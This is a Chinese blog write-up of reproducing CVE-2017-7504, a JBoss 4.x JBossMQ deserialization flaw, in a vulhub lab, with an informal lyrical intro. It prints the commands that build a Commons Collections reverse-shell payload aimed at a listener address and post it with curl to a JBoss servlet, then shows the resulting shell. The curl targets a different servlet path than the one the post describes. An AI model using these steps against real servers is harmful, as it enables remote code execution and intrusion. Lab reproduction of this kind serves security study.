# CVE-2017-7504 JBoss 4.x JBossMQ JMS 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15717435.html`](https://www.cnblogs.com/peace-and-romance/p/15717435.html)

### 0X00-引言

* * *

love is over

请你不要再提起

过去就像如流云

他妈的总是要思考一些骚话，要不然不符合我这文艺的个性，wocao

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-环境描述

* * *

JBoss AS 4.x 及之前版本中，JbossMQ 实现过程的`JMS over HTTP Invocation Layer`的`HTTPServerILServlet.java`文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

该漏洞出现在`/jbossmq-httpil/HTTPServerILServlet`请求中，若访问 200，则可能存在漏洞。

影响版本：JBoss AS 4.x 及之前版本

### 0X03-漏洞复现

* * *

和 CVE-2015-7501 JBoss JMXInvokerServlet 反序列化漏洞利用流程一样，只不过是接口换了而已

##### 01-验证

`http://192.168.234.128:8080/jbossmq-httpil/HTTPServerILServlet`

![image-20211221213131862](img/b363e6f46169e771deef1ea31f5c9a33.png)

可能存在漏洞

##### 02-重定向到`ReverseShellCommonsCollectionsHashMap.ser`文件

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.234.135:888   #填写监听机 IP 和 port
curl http://192.168.234.128:8080//invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  #提交二进制数据 
```

![image-20211221200545588](img/7a3fe15fb4d0342fbf35d6f203e77dfc.png)

![image-20211221213724772](img/1599bd651433a169d5d784b3c9d9fca5.png)

##### 03-反弹 shell

![image-20211221213802102](img/4aba5dcfe55f5f5f0a43f6d1f54686b8.png)

### 0X04-工具检测

* * *

工具下载：[`github.com/s0k/Deserialize`](https://github.com/s0k/Deserialize)

乱码不知什么原因

![image-20211221213907851](img/7b65f3536ccff23b7cdc7d16f9909f5d.png)

### 0X05-免责声明

* * *

仅供学习使用

### 0X06-参考

* * *

[[Vulhub] JBoss 反序列化漏洞复现](https://blog.csdn.net/weixin_45605352/article/details/120305428?utm_term=vulhub%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-120305428&spm=3001.4430)